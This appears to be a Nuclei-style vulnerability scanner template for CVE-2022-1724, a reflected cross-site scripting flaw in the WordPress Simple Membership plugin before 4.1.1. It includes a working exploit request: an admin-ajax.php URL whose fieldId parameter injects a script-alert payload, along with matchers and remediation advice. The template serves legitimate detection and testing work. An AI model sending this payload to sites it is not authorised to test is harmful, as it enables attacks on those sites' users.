flow: http(1) && http(2)
http:
- matchers:
  - condition: and
    internal: true
    type: word
    words:
    - Simple Membership
    - 'Tags:'
  raw:
  - 'GET /wp-content/plugins/simple-membership/readme.txt HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - part: body
    type: word
    words:
    - '"<script>alert(document.domain)</script>",'
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/wp-admin/admin-ajax.php?action=swpm_validate_email&fieldId=%22%3Cscript%3Ealert(document.domain)%3C/script%3E'
id: CVE-2022-1724
info:
  author: Akincibor
  classification:
    cpe: cpe:2.3:a:simple-membership-plugin:simple_membership:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2022-1724
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.89597
    epss-score: 0.05224
  description: WordPress Simple Membership plugin before 4.1.1 contains a reflected
    cross-site scripting vulnerability. It does not properly sanitize and escape parameters
    before outputting them back in AJAX actions.
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    inject malicious scripts into web pages viewed by users, leading to potential
    data theft, session hijacking, or defacement of the affected website.

    '
  metadata:
    framework: wordpress
    max-request: 2
    product: simple_membership
    vendor: simple-membership-plugin
    verified: true
  name: WordPress Simple Membership <4.1.1 - Cross-Site Scripting
  reference:
  - https://wpscan.com/vulnerability/96a0a667-9c4b-4ea6-b78a-0681e9a9bbae
  - https://nvd.nist.gov/vuln/detail/CVE-2022-1724
  - https://github.com/ARPSyndicate/cvemon
  - https://github.com/ARPSyndicate/kenzer-templates
  - https://github.com/cyllective/CVEs
  remediation: 'Update to the latest version of WordPress Simple Membership plugin
    (4.1.1 or higher) to mitigate the vulnerability.

    '
  severity: medium
  tags: cve,cve2022,xss,wp,wordpress,wpscan,wp-plugin,simple-membership-plugin,vuln
